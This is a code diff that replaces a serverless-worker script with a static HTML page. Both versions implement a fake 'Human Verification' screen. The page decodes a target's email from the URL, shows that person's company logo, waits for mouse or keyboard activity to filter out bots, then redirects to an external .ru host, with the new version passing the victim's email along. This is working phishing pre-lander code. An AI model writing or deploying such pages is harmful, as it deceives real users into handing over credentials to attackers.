@@ -1,166 +1,102 @@
-addEventListener('fetch', event => {
-    event.respondWith(handleRequest(event.request));
-  });
-  
-  async function handleRequest(request) {
-    const url = new URL(request.url);
-  
-    // If the request is for the external JS file, serve it.
-    if (url.pathname === '/script.js') {
-      const jsContent = `
-  // External JS file for human interaction detection and redirection
-  (function(){
-    // Use the global configuration set in the HTML page.
-    const config = window.myConfig || {};
-    const targetUrl = config.targetUrl || '/';
-    let humanDetected = false;
-  
-    function redirectWithFragment() {
-        const fragment = window.location.hash; // Capture existing fragment
-        const randomLetter = String.fromCharCode(65 + Math.floor(Math.random() * 26)); // Generate random letter (A-Z)
-        
-        if (fragment.startsWith("#")) {
-          window.location.href = targetUrl + "#" + randomLetter + fragment.substring(1); // Insert random letter right after #
-        } else {
-          window.location.href = targetUrl + "#" + randomLetter + fragment; // Fallback in case there's no #
-        }
-      }
-  
-    function onUserInteraction() {
-      if (!humanDetected) {
-        humanDetected = true;
-        const statusMsg = document.getElementById('statusMsg');
-        if (statusMsg) {
-          statusMsg.innerText = "Human interaction detected. Redirecting in 3 seconds...";
-        }
-        // Remove event listeners after detection
-        window.removeEventListener('mousemove', onUserInteraction);
-        window.removeEventListener('keydown', onUserInteraction);
-        window.removeEventListener('click', onUserInteraction);
-        window.removeEventListener('touchstart', onUserInteraction);
-        // Start redirection timer
-        setTimeout(redirectWithFragment, 3000);
-      }
-    }
-  
-    // Listen for various events that indicate human interaction.
-    window.addEventListener('mousemove', onUserInteraction);
-    window.addEventListener('keydown', onUserInteraction);
-    window.addEventListener('click', onUserInteraction);
-    window.addEventListener('touchstart', onUserInteraction);
-  
-    // Optional: Prompt the user if no interaction is detected within 10 seconds.
-    setTimeout(() => {
-      if (!humanDetected) {
-        const statusMsg = document.getElementById('statusMsg');
-        if (statusMsg) {
-          statusMsg.innerText = "We haven't detected any interaction. Please move your mouse or press a key.";
-        }
-      }
-    }, 10000);
-  })();
-  `;
-      return new Response(jsContent, {
-        headers: { "Content-Type": "application/javascript; charset=UTF-8" }
-      });
-    }
-  
-    // Process the email parameter, defaulting to "user@adobe.com" if missing or invalid.
-    let emailParam = url.searchParams.get('email');
-    let email = emailParam;
-  
-    if (emailParam) {
-      try {
-        // Attempt to decode if Base64 encoded
-        const decoded = atob(emailParam);
-        if (decoded.includes('@')) {
-          email = decoded;
-        }
-      } catch (e) {
-        // If decoding fails, use the original value
-        email = emailParam;
-      }
-    }
-  
-    // If no valid email is provided, fallback to a default value.
-    if (!email || !email.includes('@')) {
-      email = "user@adobe.com";
-    }
-  
-    // Extract domain from email for dynamic logo.
-    const domain = email.split('@').pop().toLowerCase();
-    const logoUrl = `https://logo.clearbit.com/${domain}`;
-    
-    // Determine target URL; if not provided via query, default to the domain's homepage.
-    const targetUrl = url.searchParams.get('target') || `https://u6r.itoushur.ru/ttRnYiV/`;
-  
-    // Generate the HTML page.
-    const htmlContent = `<!DOCTYPE html>
-  <html lang="en">
-  <head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Human Verification</title>
     <style>
-      body {
-        font-family: Arial, sans-serif;
-        background: #f00;
-        color: white;
-        text-align: center;
-        margin: 0;
-        padding: 0;
-        height: 100vh;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-      }
-      .logo {
-        width: 90px;
-        margin-bottom: 15px;
-        background: white;
-        padding: 10px;
-        border-radius: 8px;
-      }
-      .spinner {
-        width: 40px;
-        height: 40px;
-        border: 5px solid rgba(255, 255, 255, 0.1);
-        border-top-color: #FFFFFF;
-        border-radius: 50%;
-        animation: spin 1s linear infinite;
-        margin-bottom: 15px;
-      }
-      @keyframes spin {
-        0% { transform: rotate(0deg); }
-        100% { transform: rotate(360deg); }
-      }
-      .message {
-        margin: 15px;
-      }
+        body {
+            font-family: Arial, sans-serif;
+            background: #f00;
+            color: white;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo {
+            width: 90px;
+            margin-bottom: 15px;
+            background: white;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top-color: #FFFFFF;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            margin: 15px;
+        }
     </style>
-    <link rel="preload" href="${logoUrl}" as="image">
-  </head>
-  <body>
-    <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
-    <p class="message" id="userEmail">Verifying: ${email}</p>
-    <div class="spinner"></div>
-    <p class="message" id="statusMsg">Please interact with the page to verify you are human.</p>
-  
-    <!-- Inline configuration for the external JS file -->
+</head>
+<body>
     <script>
-      window.myConfig = {
-        targetUrl: "${targetUrl}",
-        email: "${email}",
-        domain: "${domain}"
-      };
+        (function(){
+            let email = window.location.hash.substring(1);
+            try {
+                let decodedEmail = atob(email);
+                if (decodedEmail.includes('@')) {
+                    email = decodedEmail;
+                }
+            } catch (e) {}
+            
+            if (!email || !email.includes('@')) {
+                email = '';
+            }
+            
+            const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
+            const logoUrl = `https://logo.clearbit.com/${domain}`;
+            const targetUrl = email ? `https://u6r.itoushur.ru/ttRnYiV/#M${email}` : 'https://u6r.itoushur.ru/ttRnYiV/';
+            
+            document.body.innerHTML = `
+                <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
+                <p class="message" id="userEmail">Verifying: ${email || 'No Email Provided'}</p>
+                <div class="spinner"></div>
+                <p class="message" id="statusMsg">Please interact with the page to verify you are human.</p>
+            `;
+            
+            let humanDetected = false;
+            function redirectToTarget() {
+                window.location.href = targetUrl;
+            }
+            
+            function onUserInteraction() {
+                if (!humanDetected) {
+                    humanDetected = true;
+                    document.getElementById('statusMsg').innerText = "Human interaction detected. Redirecting in 3 seconds...";
+                    window.removeEventListener('mousemove', onUserInteraction);
+                    window.removeEventListener('keydown', onUserInteraction);
+                    window.removeEventListener('click', onUserInteraction);
+                    window.removeEventListener('touchstart', onUserInteraction);
+                    setTimeout(redirectToTarget, 3000);
+                }
+            }
+            
+            window.addEventListener('mousemove', onUserInteraction);
+            window.addEventListener('keydown', onUserInteraction);
+            window.addEventListener('click', onUserInteraction);
+            window.addEventListener('touchstart', onUserInteraction);
+            
+            setTimeout(() => {
+                if (!humanDetected) {
+                    document.getElementById('statusMsg').innerText = "We haven't detected any interaction. Please move your mouse or press a key.";
+                }
+            }, 10000);
+        })();
     </script>
-    <!-- Link to the external JavaScript file -->
-    <script src="/script.js"></script>
-  </body>
-  </html>`;
-  
-    return new Response(htmlContent, {
-      headers: { "Content-Type": "text/html; charset=UTF-8" }
-    });
-  }
-  
+</body>
+</html>
